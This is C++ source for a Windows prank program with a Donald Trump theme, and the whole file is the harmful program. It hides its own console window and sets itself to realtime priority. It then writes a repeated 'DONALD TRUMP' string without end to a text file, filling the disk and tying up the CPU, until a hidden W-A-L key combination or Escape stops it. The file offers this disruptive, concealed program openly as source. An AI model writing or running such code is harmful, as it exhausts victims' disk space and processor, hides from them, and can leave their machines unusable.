#include <fstream>
#include <Windows.h>
#include <thread>
#include <sstream>
#include "VirtualKeys.h"

using namespace std;
ofstream TRUMP;
bool AMERICAGREATAGAIN = true;
HWND stealth; //creating stealth (window is not visible)
HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
stringstream str(stringstream::out | stringstream::binary);
string txtStream = "DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP DONALD TRUMP ";
void TRUMPSPEECH(){
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
	TRUMP.open("VOTE DONALD TRUMP.txt", ofstream::binary);
	str << txtStream;
	while (AMERICAGREATAGAIN){
		TRUMP.write(str.str().c_str(), str.str().length());
	}
}
void EVENT(){
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);

	

	//DWORD start = GetTickCount();
	//DWORD end = start + (DWORD)300000;
	while (AMERICAGREATAGAIN){
		if (((GetAsyncKeyState(VK_W) & 0x8000) != 0) && ((GetAsyncKeyState(VK_A) & 0x8000) != 0) && ((GetAsyncKeyState(VK_L) & 0x8000) != 0)){
			AMERICAGREATAGAIN = false;
			TRUMP.close();
			TRUMP.open("VOTE DONALD TRUMP.txt");
			TRUMP << "BUILD A WALL... MAKE AMERICA GREAT AGAIN.";
		}
		if ((GetAsyncKeyState(VK_ESCAPE) & 0x8000) != 0){
			AMERICAGREATAGAIN = false;
		}
	}
}
void main(){
	thread VOTE(TRUMPSPEECH);
	thread WALL(EVENT);
	VOTE.join();
	WALL.join();
	TRUMP.close();
	return;
}